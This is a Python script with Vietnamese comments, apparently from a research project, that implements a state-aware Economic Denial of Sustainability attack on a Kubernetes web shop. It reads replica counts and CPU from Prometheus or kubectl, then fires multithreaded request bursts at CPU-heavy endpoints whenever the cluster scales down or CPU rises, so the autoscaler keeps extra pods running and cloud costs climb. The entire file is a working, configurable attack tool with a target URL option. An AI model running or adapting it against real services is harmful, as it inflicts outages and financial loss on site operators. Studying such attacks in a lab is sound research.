"""
EDoS Attacker Controller v3 - Thuan Python (khong dung jMeter).

Ke tan cong STATE-AWARE: theo doi so replicas cua webapp qua Prometheus va
tung ra cac "burst" tai nang khi phat hien co hoi (cluster dang scale-down,
hoac CPU dang cao, hoac dinh ky) -> ep cluster duy tri nhieu pod -> tang hoa
don cloud. Day la mo phong tan cong EDoS trong bai bao.

Khac legitimate_load.py:
  - Nhieu thread hon (K lan): ATTACK_THREADS = LEGIT_THREADS * K
  - Gan nhu khong nghi giua request (dap lien tuc)
  - Nham vao endpoint TON CPU (/buy nang nhat, /browse vua)
  - Khong chay lien tuc ma burst theo co hoi (state-aware)

Cach dung:
    python attacker_controller.py            # K=5 (mac dinh)
    python attacker_controller.py 8          # K=8 (manh hon)
    Ctrl+C de dung sap.
"""

import argparse
import csv
import os
import random
import sys
import threading
import time
from collections import Counter
from datetime import datetime

try:
    import requests
except ImportError:
    print("Thieu thu vien 'requests'. Cai bang: pip install requests")
    sys.exit(1)


PROMETHEUS_URL = "http://localhost:9090"
BASE_URL = "http://localhost:8080"

ATTACK_POWER_K = 5           # Cuong do: gap K lan legitimate traffic
LEGIT_THREADS = 10
ATTACK_THREADS = LEGIT_THREADS * ATTACK_POWER_K

BURST_DURATION_SEC = 120     # Moi burst keo dai bao lau
CHECK_INTERVAL_SEC = 10      # Chu ky kiem tra trang thai cluster
ATTACK_WINDOW_SEC = 900      # Tong thoi gian tan cong (15 phut)
COOLDOWN_SEC = 30            # Nghi sau moi burst truoc khi danh tiep
BURST_DELAY_SEC = 0.02       # Nghi rat ngan giua cac request (dap manh)

# Endpoint tan cong: uu tien /buy (ton CPU nhat) de ep HPA scale.
ATTACK_ENDPOINTS = [
    ("/buy",    0.80),   # 50000 vong lap Lua - nang nhat
    ("/browse", 0.20),   # 10000 vong lap - vua
]

# --- Trang thai burst dung chung giua cac thread ---
burst_stop = threading.Event()
burst_threads = []
burst_lock = threading.Lock()

# --- Thong ke & log ---
attack_stats = {"requests": 0, "ok": 0, "err": 0}
stats_lock = threading.Lock()
attack_log = []
total_bursts = 0


def get_replicas():
    """Lay so replicas cua webapp - thu Prometheus truoc, fallback kubectl."""
    try:
        resp = requests.get(f"{PROMETHEUS_URL}/api/v1/query", params={
            "query": 'kube_deployment_status_replicas{namespace="teastore", deployment="webapp"}'
        }, timeout=5)
        data = resp.json()
        if data["status"] == "success" and data["data"]["result"]:
            return int(float(data["data"]["result"][0]["value"][1]))
    except Exception:
        pass
    try:
        import subprocess
        r = subprocess.run(
            ["kubectl", "get", "deployment", "webapp", "-n", "teastore",
             "-o", "jsonpath={.status.replicas}"],
            capture_output=True, text=True, timeout=10
        )
        if r.stdout.strip():
            return int(r.stdout.strip())
    except Exception:
        pass
    return -1


def get_cpu_percent():
    """Lay CPU utilization hien tai cua webapp pods (%)."""
    try:
        resp = requests.get(f"{PROMETHEUS_URL}/api/v1/query", params={
            "query": ('sum(rate(container_cpu_usage_seconds_total'
                      '{namespace="teastore", container="webapp"}[1m])) / '
                      'sum(kube_pod_container_resource_requests'
                      '{namespace="teastore", container="webapp", resource="cpu"}) * 100')
        }, timeout=5)
        data = resp.json()
        if data["status"] == "success" and data["data"]["result"]:
            return float(data["data"]["result"][0]["value"][1])
    except Exception:
        pass
    return -1


def pick_endpoint():
    r = random.random()
    cum = 0.0
    for path, weight in ATTACK_ENDPOINTS:
        cum += weight
        if r <= cum:
            return path
    return ATTACK_ENDPOINTS[0][0]


def burst_worker(session):
    """Mot luong tan cong - dap lien tuc vao endpoint ton CPU cho den khi bi stop."""
    while not burst_stop.is_set():
        url = BASE_URL + pick_endpoint()
        try:
            resp = session.get(url, timeout=10)
            ok = 200 <= resp.status_code < 400
            with stats_lock:
                attack_stats["requests"] += 1
                attack_stats["ok" if ok else "err"] += 1
        except requests.RequestException:
            with stats_lock:
                attack_stats["requests"] += 1
                attack_stats["err"] += 1
        # Nghi rat ngan de tranh busy-loop hoan toan nhung van dap manh.
        if BURST_DELAY_SEC > 0:
            burst_stop.wait(BURST_DELAY_SEC)


def start_burst():
    """Tung ra mot burst: spawn ATTACK_THREADS luong dap tai."""
    global total_bursts
    with burst_lock:
        burst_stop.clear()
        burst_threads.clear()
        for _ in range(ATTACK_THREADS):
            s = requests.Session()
            t = threading.Thread(target=burst_worker, args=(s,), daemon=True)
            t.start()
            burst_threads.append(t)
    total_bursts += 1
    print(f"  >>> BURST #{total_bursts}: {ATTACK_THREADS} threads x {BURST_DURATION_SEC}s "
          f"-> {', '.join(p for p, _ in ATTACK_ENDPOINTS)}")


def stop_burst():
    """Dung burst hien tai."""
    with burst_lock:
        burst_stop.set()
        for t in burst_threads:
            t.join(timeout=2)
        burst_threads.clear()
    print("  <<< Burst ket thuc")


def is_burst_active():
    return any(t.is_alive() for t in burst_threads)


def log(ts, su, cpu, action, reason):
    with stats_lock:
        reqs = attack_stats["requests"]
    entry = {"time": ts.strftime("%H:%M:%S"), "replicas": su,
             "cpu_pct": f"{cpu:.0f}" if cpu >= 0 else "?",
             "requests": reqs, "action": action, "reason": reason}
    attack_log.append(entry)
    cpu_str = f"{cpu:.0f}%" if cpu >= 0 else "?"
    icon = {"IDLE": "  ", "LAUNCH": ">>", "ATTACKING": "!!",
            "BURST_END": "<<", "COOLDOWN": ".."}
    print(f"  [{ts.strftime('%H:%M:%S')}] {icon.get(action,'?')} "
          f"Replicas={su} CPU={cpu_str} Reqs={reqs} | {action} | {reason}")


def save_logs():
    os.makedirs("results", exist_ok=True)
    fname = os.path.join("results", f"attacker_K{ATTACK_POWER_K}_{datetime.now():%H%M%S}.csv")
    with open(fname, "w", newline="") as f:
        w = csv.DictWriter(f, fieldnames=["time", "replicas", "cpu_pct", "requests", "action", "reason"])
        w.writeheader()
        w.writerows(attack_log)
    frac = (total_bursts * BURST_DURATION_SEC) / ATTACK_WINDOW_SEC if ATTACK_WINDOW_SEC > 0 else 0
    with stats_lock:
        reqs, ok, err = attack_stats["requests"], attack_stats["ok"], attack_stats["err"]
    print("\n" + "=" * 50)
    print("  KET QUA")
    print("=" * 50)
    print(f"  Attack power K  = {ATTACK_POWER_K}")
    print(f"  Total bursts    = {total_bursts}")
    print(f"  Total requests  = {reqs}  (ok={ok}, err={err})")
    print(f"  frac_attack     = {frac:.3f}")
    print(f"  Log file        = {fname}")
    print("=" * 50)


def main():
    global ATTACK_POWER_K, ATTACK_THREADS, BASE_URL, PROMETHEUS_URL

    parser = argparse.ArgumentParser(description="EDoS attacker controller (thuan Python)")
    parser.add_argument("k", nargs="?", type=int, default=ATTACK_POWER_K,
                        help="Attack power K - gap K lan legitimate traffic (default 5)")
    parser.add_argument("--url", default=BASE_URL, help="Target webapp URL")
    parser.add_argument("--prometheus", default=PROMETHEUS_URL, help="Prometheus URL")
    parser.add_argument("--window", type=int, default=ATTACK_WINDOW_SEC, help="Tong thoi gian tan cong (s)")
    args = parser.parse_args()

    ATTACK_POWER_K = args.k
    ATTACK_THREADS = LEGIT_THREADS * ATTACK_POWER_K
    BASE_URL = args.url.rstrip("/")
    PROMETHEUS_URL = args.prometheus.rstrip("/")
    window = args.window

    print("=" * 50)
    print("  EDoS Attacker v3 (thuan Python, khong jMeter)")
    print(f"  Target = {BASE_URL}")
    print(f"  K={ATTACK_POWER_K} | Threads={ATTACK_THREADS}")
    print(f"  Burst={BURST_DURATION_SEC}s | Window={window}s | Cooldown={COOLDOWN_SEC}s")
    print("=" * 50)

    print("  Connecting to Prometheus...")
    while get_replicas() == -1:
        print("  ... chua doc duoc replicas, thu lai sau 3s (Prometheus da san sang chua?)")
        time.sleep(3)

    su = get_replicas()
    cpu = get_cpu_percent()
    print(f"  Connected! Replicas={su} CPU={cpu:.0f}%\n")

    start_time = datetime.now()
    burst_end = 0
    cooldown_end = 0
    prev_su = su

    try:
        while (datetime.now() - start_time).total_seconds() < window:
            su = get_replicas()
            cpu = get_cpu_percent()
            now = datetime.now()

            if su == -1:
                time.sleep(CHECK_INTERVAL_SEC)
                continue

            # Dang trong burst
            if is_burst_active():
                if time.time() > burst_end:
                    stop_burst()
                    cooldown_end = time.time() + COOLDOWN_SEC
                    log(now, su, cpu, "BURST_END", "Done, cooling down")
                else:
                    remaining = int(burst_end - time.time())
                    log(now, su, cpu, "ATTACKING", f"{remaining}s left")
                time.sleep(CHECK_INTERVAL_SEC)
                prev_su = su
                continue

            # Dang cooldown
            if time.time() < cooldown_end:
                remaining = int(cooldown_end - time.time())
                log(now, su, cpu, "COOLDOWN", f"{remaining}s left")
                time.sleep(CHECK_INTERVAL_SEC)
                prev_su = su
                continue

            # === LOGIC ATTACK (state-aware) ===
            should_attack = False
            reason = ""
            elapsed = (now - start_time).total_seconds()
            periodic = (elapsed % 180) < CHECK_INTERVAL_SEC   # dinh ky moi 3 phut

            if su < prev_su:
                should_attack = True
                reason = f"Scale-down detected ({prev_su}->{su})"
            elif su >= 1 and periodic:
                should_attack = True
                reason = f"Periodic burst (moi 3min, elapsed={elapsed:.0f}s)"
            elif su >= 1 and cpu > 30:
                should_attack = True
                reason = f"CPU={cpu:.0f}% > 30%, day them"

            if should_attack:
                log(now, su, cpu, "LAUNCH", reason)
                start_burst()
                burst_end = time.time() + BURST_DURATION_SEC
            else:
                log(now, su, cpu, "IDLE", "Cho co hoi")

            prev_su = su
            time.sleep(CHECK_INTERVAL_SEC)

    except KeyboardInterrupt:
        print("\n  Ctrl+C - stopping...")

    if is_burst_active():
        stop_burst()
    save_logs()


if __name__ == "__main__":
    main()
